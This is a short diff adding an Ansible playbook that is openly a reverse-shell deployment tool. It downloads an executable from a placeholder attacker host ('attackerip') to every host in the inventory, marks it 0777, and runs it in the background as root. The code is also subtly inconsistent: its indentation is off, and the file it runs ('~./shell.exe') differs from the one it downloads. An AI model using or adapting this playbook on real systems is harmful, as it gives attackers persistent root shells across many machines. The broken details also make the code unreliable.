@@ -1,0 +1,12 @@
+- hosts: all               #host group on /etc/ansible/hosts or all
+  tasks:
+  - name: Download Reverse Shell Executable    # Edit this. Or not
+    get_url:
+    url: http://attackerip/particle    # Edit this
+    dest: ~/
+    mode: 0777
+
+  - name: Execute & Background Reverse Shell
+    become: true
+    become_user: root   # Or any user you want
+    shell: nohup ~./shell.exe & exit
